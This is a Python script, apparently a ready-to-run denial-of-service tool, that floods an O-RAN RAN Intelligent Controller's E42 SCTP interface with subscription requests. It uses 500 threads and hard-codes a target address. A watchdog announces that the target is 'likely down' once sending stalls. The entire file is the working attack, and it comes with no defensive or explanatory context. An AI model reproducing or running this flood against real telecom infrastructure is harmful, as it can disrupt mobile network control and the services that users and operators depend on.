#!/usr/bin/env python3
import threading
import time
import sctp
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Configuration
RIC_IP = "10.9.71.235"
RIC_PORT = 36421
THREAD_COUNT = 500
REQUESTS_PER_THREAD = 10000
FLOOD_DELAY = 0.001
PPID_E42_RIC_SUBSCRIPTION_REQ = 0x0064

# E42 Subscription Request payload
E42_SUB_REQ = bytes.fromhex(
    "0015000a00000001000000010002000100030004000100050006"
    "000700080009000a000b000c000d000e000f0010001100120013"
    "001400150016001700180019001a001b001c001d001e001f0020"
)

class AttackMonitor:
    def __init__(self):
        self.total_sent = 0
        self.lock = threading.Lock()

monitor = AttackMonitor()

def flood_worker(stop_event):
    try:
        sock = sctp.sctpsocket_tcp()
        sock.setblocking(False)
        sock.connect_ex((RIC_IP, RIC_PORT))
        for _ in range(REQUESTS_PER_THREAD):
            if stop_event.is_set():
                return
            try:
                sock.sctp_send(E42_SUB_REQ, ppid=PPID_E42_RIC_SUBSCRIPTION_REQ)
                with monitor.lock:
                    monitor.total_sent += 1
            except (BlockingIOError, OSError):
                time.sleep(0.01)
            except Exception:
                return
            time.sleep(FLOOD_DELAY)
    except Exception:
        pass
    finally:
        try:
            sock.close()
        except:
            pass

def watchdog(stop_event):
    NO_PROGRESS_TIMEOUT = 15  # Seconds
    last_count = 0
    last_check = time.time()
    while not stop_event.is_set():
        time.sleep(5)
        with monitor.lock:
            current_count = monitor.total_sent
        if current_count > last_count:
            last_count = current_count
            last_check = time.time()
        elif time.time() - last_check > NO_PROGRESS_TIMEOUT:
            print(f"\n{Fore.YELLOW}[Monitor]{Style.RESET_ALL} {Fore.RED}No progress detected for 15 seconds. Target likely down. Attack done.{Style.RESET_ALL}")
            stop_event.set()
            break

def main():
    stop_event = threading.Event()

    # Print only the required banner
    print(f"{Fore.CYAN}⚡ Starting E42 Subscription Flood Attack{Style.RESET_ALL}")
    print(f"{Fore.WHITE}► Target: {Fore.CYAN}{RIC_IP}:{RIC_PORT}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}► Threads: {Fore.CYAN}{THREAD_COUNT}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}► Requests/Thread: {Fore.CYAN}{REQUESTS_PER_THREAD}{Style.RESET_ALL}")

    # Start watchdog thread
    threading.Thread(target=watchdog, args=(stop_event,), daemon=True).start()

    # Start attack threads
    for _ in range(THREAD_COUNT):
        t = threading.Thread(target=flood_worker, args=(stop_event,))
        t.daemon = True
        t.start()

    try:
        while not stop_event.is_set():
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[Monitor]{Style.RESET_ALL} {Fore.RED}Attack interrupted by user.{Style.RESET_ALL}")
        stop_event.set()

if __name__ == "__main__":
    main()
